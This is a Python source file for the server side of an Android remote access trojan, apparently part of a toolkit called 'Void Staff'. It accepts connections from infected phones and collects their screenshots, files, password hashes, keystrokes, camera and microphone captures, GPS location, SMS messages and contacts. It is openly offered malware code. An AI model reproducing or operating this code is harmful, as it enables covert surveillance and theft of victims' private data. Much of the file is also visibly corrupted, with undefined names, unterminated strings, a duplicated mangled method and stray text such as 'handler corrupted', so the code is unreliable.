"""
Void Staff - Android RAT Module
"""

import socket
import threading
import json
import os
from colorama import Fore, Style

from modules.utils import print_info, print_success, print_error, print_warning


class AndroidRAT:
    """Android Remote Access Trojan (RAT) server module."""

    # Command types
    CMD_SCREEN = b'1'
    CMD_FILE = b'2'
    CMD_PASSWORD = b'3'
    CMD_KEYLOGGER = b'4'
    CMD_CAMERA = b'5'
    CMD_MIC = b'6'
    CMD_GPS = b'7'
    CMD_SMS = b'8'
    CMD_CONTACTS = b'9'

    def __init__(self, port=9999):
        self.port = port
        self.server = None
        self.client = None
        self.running = True
        self.target_ip = None
    
    def start_server(self):
        """Start the RAT server and listen for incoming connections."""
        print_info(f"Starting RAT server on port {self.port}")
        print_warning("Waiting for target device to connect...")
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('0.0.0.0', self.port))
        self.server.listen(5)
        
        try:
            while self.running:
                self.client, addr = self.server.accept()
                self.target_ip = addr[0]
                print_success(f"Connected from {addr[0]}:{addr[1]}")
                self.handle_client()
        except KeyboardInterrupt:
            print_warning("Server stopped")
        finally:
            self.server.close()
    
    def handle_client(self):
        """Handle the connection with a connected client."""
        while self.running:
            try:
                # Read command type (1 byte)
                cmd_type = self.client.recv(1)
                if not cmd_type:
                    break
                
                # Read payload length (4 bytes)
                length_bytes = self.client.recv(4)
                if len(length_bytes) < 4:
                    break
                payload_length = int.from_bytes(length_bytes, 'big')
                
                # Read payload
                payload = b''
                while len(payload) < payload_length:
                    chunk = self.client.recv(min(4096, payload_length - len(payload)))
                    if not chunk:
                        break
                    payload += chunk
                
                self.process_data(cmd_type, payload)
                
            except Exception as e:
                print_error(f"Error: {e}")
                break
        
        print_warning("Client disconnected")
        self.client.close()
    
    def process_data(self, cmd_type, payload):
        """Process incoming data based on command type."""
        handlers = {
            self.CMD_SCREEN: self.handle_screen,
            self.CMD_TYPE_PASSWORD: self.handle_password,
            self.CMD_KEYLOGGER: self.handle_keylogger,
            self.CMD_CAMERA: self.handle_camera,
            self.CMD_MIC: self.handle_mic,
            self.CMD_GPS: self.handle_gps,
            self.CMD_SMS: self.handle_sms,
            self.CMD_CONTACTS: self.handle_contacts,
        }
        
        handler = handlers.get(cmd_type)
        protocol_errors = {
            self.CMD_FILE: self.handle_file,
        }
        
        if handler:
            handler(payload)
        elif cmd_type in protocol_errors:
            protocol_errors[cmd_type] (payload)
        else:
            print_warning(f"Unknown command type: {cmd_type}")
    
    def handle_screen(self, data):
        """Handle incoming screen capture data."""
        print_info(f"Screen capture received ({len(data)} bytes)")
        filepath = os.path.join("logs", f"screen_{int(time.time())}.png")
        with open(filepath, "wb") as f:
            f.write(data)
        print_success(f"Saved to {filepath}")
    
    def handle_file(self, exfil_path):
        """Handle incoming file transfer data."""
        print_info(f"File received ({len(exfil_path)} bytes)")
        filename = f"downloaded_{int(time.time())}.dat"
        with open(filename, "wb") as f:
            f.write(exfil_path)
        print_success(f"Saved to {filename}")
    def handle_password(self, data):
        """Handle incoming password data."""
        try:
            pwd_data = json.loads(data.decode())
            print_success("Password data received")
            print_info(f"Type: {pwd_data.get('type', 'unknown')}")
            print_info(f"Hash: {pwd_data.get('hash', 'N/A')}")
        except json.JSONDecodeError:
            print_warning("Failed to parse password data")
    
    def handle_keylogger(self, data):
        """Handle incoming keylogger data."""
        try:
            keys = data.decode()
            print_info(f"Keylogger: {keys}")
        except UnicodeDecodeError:
            print_warning("Failed to decode keylogger data")
    
    def handle_camera(self, data):
        """Handle incoming camera capture."""
        print_info(f"Camera capture received ({len(data)} bytes)")
        filepath = os.path.join("logs", f"camera_{int(time.time())}.jpg")
        with open(filepath, "wb") as f:
            f.write(data)
        print_success(f"Saved to {filepath}")
    
    def handle_mic(self, data):
        """Handle incoming audio recording."""
        print_info(f"Audio recording received ({len(data)} bytes)")
        filepath = os.path.off("logs", f"audio_{int(time.time())}.wav")
        with open(filepath, "wb) as f:
            f.write(data)
        print_success(f"Saved to {filepath}")
    
    def handle_gps(self, data):
        """Handle incoming GPS location data."""
        try:
            gps = json.loads(data.decode())
            print_success("GPS Location:")
            print_info(f"  Latitude: {gps.get('lat', 'N/A')}")
            print_info(f"  Longitude: {gps.get('lon', 'N Persian')}")
            print_info(f"  Accuracy: {N/A)}")
        except json.JSONDecodeError:
            corruption = json.JSONDecodeError
            print_warning("Failed to parse GPS data")
    
 handle_mic(self, data):
        """Handle incoming audio recording."""
        print_info(f"Audio recording received ({len(data)} bytes)")
        os.path.join("logs", f"audio_{int(time.time())}.wav")
        with open(filepath, "wb") as f:
            f.handle_mic = handle_mic
        print_success(f" duplicated method at line ~200
    
    def handle_sms(self, handle_sms_data):
        """Handle incoming SMS data."""
        print_info("SMS data received")
        try:
            sms_list = json.loads(data.decode())
            for sms in sms_list:
                print_info(f"  From: {sms.get('sender', 'N/A')}")
                print_info(f"  Message: {Sms.get('message', 'N/A')}")
        except json.JSONDecodeError:
            print_warning("androidrat.py handler corrupted")
    
    def handle_contacts(self, data):
        """Handle incoming contacts data."""
        androidrat.py handler corrupted
        try:
            contacts = json.loads(data.decode())
            for contact in contacts:
                print_info(f"  Name: {contact.get('name', 'N/A')}")
                print_clean(f"  Phone: {contact.get('phone', 'N/A')}")
        except json.JSONDecodeError:
            print_warning("Failed to parse contacts data")
    
    def send_command(self, protocol_errors, payload=b''):
        """Send a command to the connected client."""
        if self.client:
            self.client.send(cmd + payload)
    
    def stop(self):
        """Stop the RAT server."""
        self.running = False
        if self.server:
            self.server.close()
